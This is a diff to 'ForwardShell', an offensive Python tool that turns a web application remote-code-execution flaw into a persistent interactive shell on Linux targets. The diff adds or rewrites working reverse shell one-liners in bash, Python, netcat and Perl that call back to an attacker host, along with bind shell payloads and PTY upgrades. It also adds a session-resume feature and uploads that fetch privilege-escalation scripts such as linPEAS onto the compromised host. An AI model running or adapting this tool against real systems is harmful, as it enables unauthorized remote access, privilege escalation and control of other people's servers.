@@ -110,14 +110,10 @@ class WebShell(object):
         self.GetProg()
 
         # Set up fifo session
-        self.session = random.randrange(10000,99999)
-        if self.verbose: print(f"[VERBOSE] Generate SessionID: {self.session}")
-        self.stdin = f'{self.working_path}/Fwdsh-input.{self.session}'
-        self.stdout = f'{self.working_path}/Fwdsh-output.{self.session}'
-        MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"
+        self.setup_fifo()
 
         # Set up shell
-        self.RunRawCmd(MakeNamedPipes, timeout=1)
+        self.RunRawCmd(self.MakeNamedPipes, timeout=1)
         raw_result = self.RunRawCmd(f"{self.LS} {self.stdout}")
         CheckConnction = self.DisplayResp(raw_result)
         if CheckConnction:
@@ -130,6 +126,7 @@ class WebShell(object):
             print(f"[ERROR] Cannot connect to {self.uri_parser(self.url)}")
             exit()
 
+        # Catch CTRL+C
         signal.signal(signal.SIGINT, self.signal_handler)
 
         # Set up read thread
@@ -156,13 +153,15 @@ class WebShell(object):
             f'\n'
             f'  ?set                    Change Bind- and RervseShell parameters, like LHOST, LPORT and Shell type\n'
             f'  ?start                  Start a {__progname__} shell module\n'
-            f'  ?start -m {{module}}      Start a specific Shell module; available modules are Upgrade, RevShell and BindShell\n'
-            f'  ?upload                 Upload a file or module to the target working directory {self.working_path}\n'
-            f'  ?upload {{filename}}      Upload a local file to the target\n'
-            f'  ?upload -m {{module}}     Upload a specific module to the target; available modules are LinPeas, exploit-suggester and linEnum\n'
+            f'  ?start -m {{module}}      Start a specific shell module; available modules are Upgrade, RevShell and BindShell\n'
+            f'  ?resume                 Resumes an existing shell on the target\n'
+            f'  ?upload                 Upload a file or module to the targets working directory {self.working_path}\n'
+            f'  ?upload {{filename}}      Upload a file from your local working directory to the target\n'
+            f'  ?upload -m {{module}}     Upload a module to the target; available modules are LinPeas, exploit-suggester and linEnum\n'
             f'  ?download {{filename}}    Download a file from the target to your local working directory\n'
-            f'  ?exit                   Stops the Shell, kills processes, removes files on the target system and exits the program\n'
-            f'  ?exit -force            Stops the Shell, kill all processes and files from all possible running or stuck Shells\n')
+            f'  ?exit                   Stops the shell, kills own processes, removes own files on the target system and exits the program\n'
+            f'  ?exit -force            Stops the shell, kill all processes and files from all possible running or stuck Shells\n'
+            f'  ?exit -silent           Pause the shell, disconnects from the target and wait to get it reconnected with ?resume\n')
 
         elif module == 'Set':
             print(
@@ -231,30 +230,41 @@ class WebShell(object):
     def SetParameter(self, option, value):
         option, value = option.strip().lower(), value.strip().lower()
         if option == 'lhost':
-            self.lhost = f'{value}'
-            print()
-            print(f'  [+] LHOST      {self.lhost}')
-            print()
+            ip_pattern = re.compile("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
+            ip_valid = ip_pattern.match(value)
+            if ip_valid:
+                self.lhost = value
+                print()
+                print(f'  [+] LHOST      {self.lhost}')
+                print()
+            else:
+                print(f'[ERROR] The given input {value} is not a valid IPv4 address')
         elif option == 'lport':
-            self.lport = f'{value}'
-            print()
-            print(f'  [+] LPORT     {self.lport}')
-            print()
+            try:
+                if int(value) >= 1 and int(value) <= 65535:
+                    self.lport = int(value)
+                    print()
+                    print(f'  [+] LPORT      {self.lport}')
+                    print()
+                else:
+                    print(f'[ERROR] The given input {value} is not a valid tcp port')
+            except:
+                print(f'[ERROR] The given input \'{value}\' is not a valid numeric tcp port')
         elif option == 'revshell':
             RevShells = ['bash','python','netcat','perl']
             if value in RevShells:
-                    self.revshell = f'{value}'
+                    self.revshell = value
                     print()
-                    print(f'  [+] Revshell  {self.revshell}')
+                    print(f'  [+] Revshell   {self.revshell}')
                     print()
             else:
                 print('[ERROR] Wrong ReverseShell version, use \'Bash\', \'Python\', \'Netcat\' or \'Perl\'\n')
         elif option == 'bindshell':
             BindShells = ['python','netcat','perl']
             if value in BindShells:
-                    self.bindshell = f'{value}'
+                    self.bindshell = value
                     print()
-                    print(f'  [+] Bindshell      {self.bindshell}')
+                    print(f'  [+] Bindshell  {self.bindshell}')
                     print()
             else:
                 print('[ERROR] Wrong BindShell version, use \'Python\', \'Netcat\' or \'Perl\'\n')
@@ -277,9 +287,9 @@ class WebShell(object):
     def UpgradeShell(self):
         if self.PYTHON:
             print(f'[*] Start PTY with {self.PYTHON}')
-            UpgradeShell = f"""{self.PYTHON} -c 'import pty; pty.spawn("/bin/bash")'"""
+            UpgradeShell = f"""{self.PYTHON} -c 'import pty; print("Fwdsh-{self.session}"); pty.spawn("/bin/bash")'"""
             self.WriteCmd(UpgradeShell)
-            print(f'Just pimp your PTY a little bit...')
+            print(f'Just pimping your PTY a little bit...')
             pimp_shell = f"""export TERM=xterm ; alias ll=\'ls -ali --color=auto\'"""
             self.WriteCmd(pimp_shell)
 
@@ -288,83 +298,52 @@ class WebShell(object):
 
     # Start ReverseShell
     def RevShell(self):
-        ##revshell = revshell.strip().lower()
+
         if self.lhost == '127.0.0.1':
-            print('[ERROR] You have to set a valid LHOST first, use ?set')
+            print('[ERROR] You have to set a valid LHOST first, use ?set lhost')
         else:
-            # Bash reverse shell
-            if self.revshell == 'bash':
-                if self.BASH:
-                    print(f'[*] Starting ReverseShell with Bash to {self.lhost} on port {self.lport}\n')
+            try:
+                if self.revshell == 'bash' and self.BASH:
+                    # Bash reverse shell
                     RevShellFormat = f"""{self.BASH} -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1' &"""
-                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
-                    self.WriteCmd(RevShellFormat)
-                else:
-                    print(f"[ERROR] No Bash found on target; ReverseShell not possible")
-            # Python reverse shell
-            elif self.revshell == 'python':
-                if self.PYTHON:
-                    print(f'[*] Starting ReverseShell with {self.PYTHON} to {self.lhost} on port {self.lport}')
+                elif self.revshell == 'python' and self.PYTHON:
+                    # Python reverse shell
                     RevShellFormat = f"""{self.PYTHON} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{self.BASH}")' &"""
-                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
-                    self.WriteCmd(RevShellFormat)
-                else:
-                    print(f"[ERROR] No Python found on target; ReverseShell not possible")
-
-            # NetCat reverse shell
-            elif self.revshell == 'netcat':
-                if self.NETCAT:
-                    print(f'[*] Starting ReverseShell with {self.NETCAT} to {self.lhost} on port {self.lport}')
+                elif self.revshell == 'netcat' and self.NETCAT:
+                    # NetCat reverse shell
                     RevShellFormat = f"""{self.NETCAT} {self.lhost} {self.lport} -e {self.BASH} &"""
-                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
-                    self.WriteCmd(RevShellFormat)
-                else:
-                    print(f"[ERROR] No Netcat or equivalent found on target; ReverseShell not possible")
-
-            # Perl reverse shell
-            elif self.revshell == 'perl':
-                if self.PERL:
-                    print(f'[*] Starting ReverseShell with {self.PERL} to {self.lhost} on port {self.lport}\n')
+                elif self.revshell == 'perl' and self.PERL:
+                    # Perl reverse shell
                     RevShellFormat = f"""{self.PERL} -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.lhost}:{self.lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' &"""
-                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
-                    self.WriteCmd(RevShellFormat)
                 else:
-                    print(f"[ERROR] No Perl found on target; ReverseShell not possible")
-            else:
+                    print(f"[ERROR] No {self.revshell} found on target; ReverseShell not possible")
+
+                print(f'[*] Starting ReverseShell with {self.revshell} to {self.lhost} on port {self.lport}\n')
+                if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
+                self.WriteCmd(RevShellFormat)
+            except:
                 print('[ERROR] Something went wrong with starting the ReverseShell')
 
     # Start BindShell
     def BindShell(self):
-        # NetCat bind shell
-        if self.bindshell == 'netcat':
-            if self.NETCAT:
-                print(f'[*] Starting BindShell with {self.NETCAT} on port {self.lport}')
+
+        try:
+            if self.bindshell == 'netcat' and self.NETCAT:
+                # NetCat bind shell
                 BindShellFormat = f"""{self.NETCAT} -nlvp {self.lport} -e {self.BASH} &"""
-                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
-                self.WriteCmd(BindShellFormat)
-            else:
-                print(f"[ERROR] No Netcat or equivalent found on target; BindShell not possible")
-
-        # Python bind shell
-        elif self.bindshell == 'python':
-            if self.PYTHON:
-                print(f'[*] Starting BindShell with {self.PYTHON} on port {self.lport}')
+            elif self.bindshell == 'python' and self.PYTHON:
+                # Python bind shell
                 BindShellFormat = f"""{self.PYTHON} -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.lport}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["{self.BASH}","-i"])' &"""
-                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
-                self.WriteCmd(BindShellFormat)
-            else:
-                print(f"[ERROR] No Python found on target; BindShell not possible")
-
-        # Perl bind shell
-        elif self.bindshell == 'perl':
-            if self.PERL:
-                print(f'[*] Starting BindShell with {self.PERL} on port {self.lport}')
+            elif self.bindshell == 'perl' and self.PERL:
+                # Perl bind shell
                 BindShellFormat = f"""{self.PERL} -MIO -e 'use Socket;$protocol=getprotobyname('tcp');socket(S,&PF_INET,&SOCK_STREAM,$protocol);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({self.lport},INADDR_ANY));listen(S,3);while(1){{accept(CONN,S);if(!($pid=fork)){{die "Cannot fork" if (!defined $pid);open STDIN,"<&CONN";open STDOUT,">&CONN";open STDERR,">&CONN";exec "/bin/bash -i";close CONN;exit 0;}}}}' &"""
-                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
-                self.WriteCmd(BindShellFormat)
             else:
-                print(f"[ERROR] No Perl found on target; BindShell not possible")
-        else:
+                print(f"[ERROR] No {self.bindshell} found on target; BindShell not possible")
+
+            print(f'[*] Starting BindShell with {self.bindshell} on port {self.lport}')
+            if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
+            self.WriteCmd(BindShellFormat)
+        except:
             print('[ERROR] Something went wrong with Starting the BindShell')
 
 ######################################################################################
@@ -465,18 +444,25 @@ class WebShell(object):
 ######################################################################################
 
     # Terminating shell and deleting files
-    def killCmd(self, force=False):
+    def killCmd(self, force=False, silent=False, end_prog=True):
+
+        if silent:
+            print(f'[!] {__progname__} will just be disconnected, your session {self.session} stays open still')
+            print(f'[*] Please consider command ?resume to get your orphaned session connected again...')
+            print(f'[*] See you again soon :-)')
+            sys.exit(1)
+
         # stop read thread
         self.stop_threads = True
         self.thread.join()
-        print(f'[*] Cleaning up sessions and files')
+        print(f'[*] Cleaning up unneeded sessions and files')
 
         if force == True:
             if self.verbose: print(f'[VERBOSE] Terminating all Shells')
-            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin.split(".")[0]} -e "-c import pty; pty.spawn("'
+            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin.split(".")[0]} -e "-c import pty; print(\\\"Fwdsh-"'
         else:
             if self.verbose: print(f'[VERBOSE] Terminating {__progname__} with SessionID: {self.session}')
-            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin} -e "-c import pty; pty.spawn("'
+            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin} -e "-c import pty; print(\\\"Fwdsh-{self.session}"'
         
         # read result of ps -aux and kill processes
         raw_result = self.WriteCmd(checkProcess, fifo=False)
@@ -500,8 +486,70 @@ class WebShell(object):
             Fwdshellfiles = f'{self.RM} -f {self.stdin} {self.stdout}'
         if self.verbose: print(f"[VERBOSE] Send data: {Fwdshellfiles}")
         self.WriteCmd(Fwdshellfiles, fifo=False)
+
+        if end_prog == False:
+            return
+
         print(f'[*] Have a nice day :-)')
-        exit()
+        sys.exit(1)
+
+######################################################################################
+#                                                                                    #
+# Command = ? resume                                                                 #
+#                                                                                    #
+# Functions are:                                                                     #
+# sess_resume           Resumes a open session                                       # 
+#                                                                                    #
+######################################################################################
+
+    # Get all open sessions and resume a specific one
+    def sess_resum(self):
+        OpenSessions = f'{self.LS} {self.stdin.split(".")[0]}.*'
+        raw_result = self.WriteCmd(OpenSessions, fifo=False)
+        result = self.DisplayResp(raw_result).split('\n')
+        print(f'Your own current session is: {self.session}\nThese are the current open sessions at {self.uri_parser(self.url)}:\n')
+        #print(f'Your current session is: {self.stdin.split(".")[1]}\nThese are the current open sessions on the target:\n')
+        for session in result:
+            print(f'> Session Number {result.index(session)}: {session.split(".")[1]}')
+        
+        try:
+            ask_session = int(input("\nTo which session number you want to connect to: "))
+
+        except:
+            print('[ERROR] You can enter digits only, please try again')
+            return
+
+        for session in result:
+            session_id = int(session.split(".")[1])
+            session_index = result.index(session)
+
+            try:
+                if ask_session == session_id or ask_session == session_index:
+                    if session_id == self.session:
+                        print('[ERROR] You cannot switch to your own current session')
+                        return
+                    if self.verbose: print(f'[VERBOSE] OK, Let\'s resume session number {session_index}: {session_id}')
+
+                    # Stop old read thread
+                    self.killCmd(end_prog=False)
+
+                    # Reconfigure session ID and restart fifo
+                    self.session = session_id
+                    self.setup_fifo(resume=True)
+                    if self.verbose:
+                        print(f'[VERBOSE] Switch STDIN to {self.stdin}')
+                        print(f'[VERBOSE] Switch STDOUT to {self.stdout}')
+                    print(f'[+] Switching to session {self.session}')
+
+                    # Restart read thread
+                    self.stop_threads = False
+                    self.thread = threading.Thread(target=self.ReadThread, args=(lambda : self.stop_threads,))
+                    self.thread.daemon = True
+                    self.thread.start()
+
+            except:
+                print(f'[ERROR] The session ID {ask_session} you have entered could not be determined')
+                break
 
 ######################################################################################
 #                                                                                    #
@@ -531,23 +579,24 @@ class WebShell(object):
 
     # Execute command
     def RunRawCmd(self, cmd, timeout=10):
+        keyword = options.keyword
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
         # Use this to adjust your RCE payload even more
         payload = urllib.parse.quote(cmd)
 
-        # Replace <RCE> in the URL
-        rce_url = self.url.replace('<RCE>', payload)
+        # Replace 'keyword' in the URL
+        rce_url = self.url.replace(keyword, payload)
 
-        # Replace <RCE> in the POST body
+        # Replace 'keyword' in the POST body
         if self.data:
-            rce_data = self.data.replace('<RCE>', payload)
+            rce_data = self.data.replace(keyword, payload)
 
-        # Replace <RCE> in the header
+        # Replace 'keyword' in the header
         rce_header = self.headers.copy()
         for header in rce_header:
             current_value = rce_header.get(header)
-            new_value = current_value.replace('<RCE>', payload)
+            new_value = current_value.replace(keyword, payload)
             rce_header[header] = new_value
 
         try:
@@ -587,11 +636,13 @@ class WebShell(object):
 # GetProg               Gets the full path of Python and Netcat at the target        #
 # split_chunks          Splits a string in chunks (for File Download)                #
 # uri_parser            Splits a url and gives the FQDN                              #
+# signal_handler        Covers a CTRL+C keyboard interrupt                           #
+# setup_fifo            Setup a new fifo shell or switch to another one              #
 #                                                                                    #
 ######################################################################################
 
     # Display the result of the request
-    # Use this to adjust the results if needed
+    # Use this function to adjust the results if needed
     def DisplayResp(self, raw_input):
 
         display_result = raw_input.strip('\n')
@@ -620,14 +671,13 @@ class WebShell(object):
 
     # Helper Module to get the file system path of a programm
     def GetBinPath(self, file):
-        first_run = True
         binary_found = False
 
         try:
             if self.verbose: print(f"[VERBOSE] Searching file path for binary {file} on {self.uri_parser(self.url)}")
 
             try:
-                # check if which found already and use it to search for binaries
+                # check if binary which has been found already and use it to search for other binaries
                 if self.WHICH:
                     filename = f'{self.WHICH} {file}'
                     raw_result = self.RunRawCmd(filename)
@@ -636,7 +686,7 @@ class WebShell(object):
                     return result
 
             except:
-                # if which has not found already or is not available at all, search the binary in common binary paths
+                # if which has not been found already or is not available at all, search the binaries in common binary paths
                 prog_path = ["/usr/bin", "/usr/sbin", "/sbin", "/bin"]
                 for path in prog_path:
                     filename = f'ls {path}/{file}'
@@ -720,9 +770,25 @@ class WebShell(object):
 
     # Stop the program gracefully
     def signal_handler(signal, frame, args):
-        print("Ok ok, I am quitting...")
-        S.killCmd()
+        print("Ok ok, I am quitting...\n")
+        print("But please consider to use '?exit', \'?exit -force\' or \'?exit -silent\' instead of CTRL+C\n")
         sys.exit(1)
+    
+    # Set up fifo session
+    def setup_fifo(self, resume=False):
+
+        if not resume:
+            # Generate random session ID
+            self.session = random.randrange(10000,99999)
+            if self.verbose: print(f"[VERBOSE] Generate random session ID: {self.session}")
+
+        # Set stdin and stdout files in filesystem
+        self.stdin = f'{self.working_path}/Fwdsh-input.{self.session}'
+        self.stdout = f'{self.working_path}/Fwdsh-output.{self.session}'
+
+        if not resume:
+            # Setup the fifo shell
+            self.MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"
     
 ######################################################################################
 #                                                                                    #
@@ -733,12 +799,12 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.3.1'
+    __version__ = '0.4.0'
 
     parser = argparse.ArgumentParser(
         add_help=True,
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        description=f'{__progname__} v{__version__} - Exploits a simple Web application RCE and builds a semiautomatic shell',
+        description=f'{__progname__} v{__version__} - Exploits a simple Web application RCE on Linux systems and builds a semiautomatic shell',
         usage=f'python3 {__progname__}.py -url <url> [-data <post-data>] [-prefix <prefix>] [-suffix <suffix>] [-P <proxy>]',
         epilog=('Program Usage Examples:\n'
         'PUT the keyword <RCE> in a GET request, a POST data body or even in an additional header\n'
@@ -757,16 +823,17 @@ if __name__ == '__main__':
         'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -prefix \'<pre>\' -suffix \'</pre>\'\n'
         '\n'
         'Use a proxy:\n'
-        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php?param1=foobar&cmd=<RCE>&param3=ABC123 -proxy \'http://127.0.0.1:8080\'\n \n'
+        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php?param1=foobar&cmd=InjectMe&param3=ABC123 -keyword \'InjectMe\' -proxy \'http://127.0.0.1:8080\'\n \n'
         ))
 
     parser.add_argument('-url', action='store', metavar='', help='Target URL (e.g. http://www.site.com/upload/shell.php?cmd=<RCE>')
-    parser.add_argument('-data', action='store', metavar='', default = '', help='Data string to be sent through POST (e.g. "cmd=<RCE>")')
+    parser.add_argument('-data', action='store', metavar='?', default = '', help='Data string to be sent through POST (e.g. "cmd=<RCE>")')
     parser.add_argument('-prefix', action='store', metavar='', default = '', help='If the responses has more then the expected RCE output use -prefix to set the unneeded pattern in front the output')
     parser.add_argument('-suffix', action='store', metavar='', default = '', help='If the response has more then the expected RCE output use -suffix to define the unneeded pattern after the output')
     parser.add_argument('-cookie', action='store', metavar='', default = '', help='HTTP Cookie header value (e.g. "PHPSESSID=h5onbf...")')
     parser.add_argument('-header', action='append', nargs='+', metavar='', help='Extra header (e.g. "Authorization: Basic QWxhZ..."')
     parser.add_argument('-proxy', action='store', metavar='', default = '', help='Use a proxy to connect to the target URL [http(s)://host:port]')
+    parser.add_argument('-keyword', action='store', metavar='', default = '<RCE>', help='change the command injection keyword from <RCE> to another value if needed')
     parser.add_argument('-verbose', action='store_true', default = False, help='Verbose output')
 
     group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
@@ -785,90 +852,103 @@ if __name__ == '__main__':
 
     # Initialize WebShell class
     S = WebShell()
-    prompt = "Shell:> "
-    
-    print("[*] Type ? for help")
-    while True:
-        cmd = input(prompt)
-        if not cmd:
-            pass
-        else:
-            CustomInput = cmd.split()
-            Option = CustomInput[0]
-            if Option == '?':
-                S.Help('main')
 
-            elif Option.casefold() == '?set':
-                if len(CustomInput) >= 3:
-                    param = CustomInput[1].lower()
-                    value = CustomInput[2].lower()
-                    S.SetParameter(param,value)
+    def prompt_loop():
+        prompt = "Shell:> "
+        
+        try:
+            print("[*] Type ? for help")
+            while True:
+                cmd = input(prompt)
+                if not cmd:
+                    pass
                 else:
-                    S.Help('Set')
-    
-            elif Option.casefold() == '?start':
-                if len(CustomInput) >= 3:
-                    param = CustomInput[1].lower()
-                    module = CustomInput[2].lower()
-                    if param == '-m':
-                        if module == 'upgrade': S.UpgradeShell()
-                        elif module == 'revshell': S.RevShell()
-                        elif module == 'bindshell': S.BindShell()
+                    CustomInput = cmd.split()
+                    Option = CustomInput[0]
+                    if Option == '?':
+                        S.Help('main')
+
+                    elif Option.casefold() == '?set':
+                        if len(CustomInput) >= 3:
+                            param = CustomInput[1].lower()
+                            value = CustomInput[2].lower()
+                            S.SetParameter(param,value)
                         else:
-                            print(f'[ERROR] {module} is no valid module')
+                            S.Help('Set')
+            
+                    elif Option.casefold() == '?start':
+                        if len(CustomInput) >= 3:
+                            param = CustomInput[1].lower()
+                            module = CustomInput[2].lower()
+                            if param == '-m':
+                                if module == 'upgrade': S.UpgradeShell()
+                                elif module == 'revshell': S.RevShell()
+                                elif module == 'bindshell': S.BindShell()
+                                else:
+                                    print(f'[ERROR] {module} is no valid module')
+                                    S.Help('Start')
+                        else:
+                            print('[ERROR] Wrong ?start option')
                             S.Help('Start')
-                else:
-                    print('[ERROR] Wrong ?start option')
-                    S.Help('Start')
 
-            elif Option.casefold() == '?upload':
-                if len(CustomInput) == 2:
-                    # cannot use space as strip seperator as it breaks a path with spaces
-                    CustomInput = cmd.split('?upload')
-                    upload_file = CustomInput[1].strip(' |"|\'')
-                    S.UploadCmd(upload_file)
-                elif len(CustomInput) >= 3:
-                    param = CustomInput[1].lower()
-                    module = CustomInput[2].lower()
-                    if param == '-m':
-                        if module == 'linpeas': module_url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
-                        elif module == 'exploit-suggester': module_url = 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh'
-                        elif module == 'linenum': module_url = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'
+                    elif Option.casefold() == '?upload':
+                        if len(CustomInput) == 2:
+                            # cannot use space as strip seperator as it breaks a path with spaces
+                            CustomInput = cmd.split('?upload')
+                            upload_file = CustomInput[1].strip(' |"|\'')
+                            S.UploadCmd(upload_file)
+                        elif len(CustomInput) >= 3:
+                            param = CustomInput[1].lower()
+                            module = CustomInput[2].lower()
+                            if param == '-m':
+                                if module == 'linpeas': module_url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
+                                elif module == 'exploit-suggester': module_url = 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh'
+                                elif module == 'linenum': module_url = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'
+                                else:
+                                    print(f'[ERROR] {module} is no valid module')
+                                    S.Help('Upload')
+                                # Download the file and upload it to the target
+                                module_name = module_url.split('/')[-1]
+                                downloaded_file = S.DownloadProg(module_url)
+                                S.UploadCmd(downloaded_file, stream=True, name=module_name)
+                            else:
+                                print('[ERROR] Wrong ?upload option')
+                                S.Help('Upload')
                         else:
-                            print(f'[ERROR] {module} is no valid module')
                             S.Help('Upload')
-                        # Download the file and upload it to the target
-                        module_name = module_url.split('/')[-1]
-                        downloaded_file = S.DownloadProg(module_url)
-                        S.UploadCmd(downloaded_file, stream=True, name=module_name)
-                    else:
-                        print('[ERROR] Wrong ?upload option')
-                        S.Help('Upload')
-                else:
-                    S.Help('Upload')
-            
-            elif Option.casefold() == '?download':
-                if len(CustomInput) >= 2:
-                    file_name = CustomInput[1]
-                    S.DownloadFile(file_name)
-                else:
-                    print('[ERROR] No download file specified')
-                    S.Help('Download')
+                    
+                    elif Option.casefold() == '?download':
+                        if len(CustomInput) >= 2:
+                            file_name = CustomInput[1]
+                            S.DownloadFile(file_name)
+                        else:
+                            print('[ERROR] No download file specified')
+                            S.Help('Download')
 
-            elif Option.casefold() == '?exit':
-                if len(CustomInput) >= 2:
-                    set_attrib = CustomInput[1].lower()
-                    if set_attrib == '-force':
-                        S.killCmd(force=True)
-                    else:
-                        print(f'[ERROR] {set_attrib} not known; exit anyway')
-                        S.killCmd()
-                else:
-                    S.killCmd()
-            
-            elif Option.startswith('?'):
-                print(f'[ERROR] Function {Option} is unknown')
-                S.Help('main')
+                    elif Option.casefold() == '?exit':
+                        if len(CustomInput) >= 2:
+                            set_attrib = CustomInput[1].lower()
+                            if set_attrib == '-force':
+                                S.killCmd(force=True)
+                            if set_attrib == '-silent':
+                                S.killCmd(silent=True)
+                            else:
+                                print(f'[ERROR] {set_attrib} not known; exit anyway')
+                                S.killCmd()
+                        else:
+                            S.killCmd()
+                    
+                    elif Option.casefold() == '?resume':
+                            S.sess_resum()
 
-            else:
-                S.WriteCmd(cmd)
+                    elif Option.startswith('?'):
+                        print(f'[ERROR] Function {Option} is unknown')
+                        S.Help('main')
+                    
+                    else:
+                        S.WriteCmd(cmd)
+        except:
+            pass
+
+    # Listening for user input
+    prompt_loop()
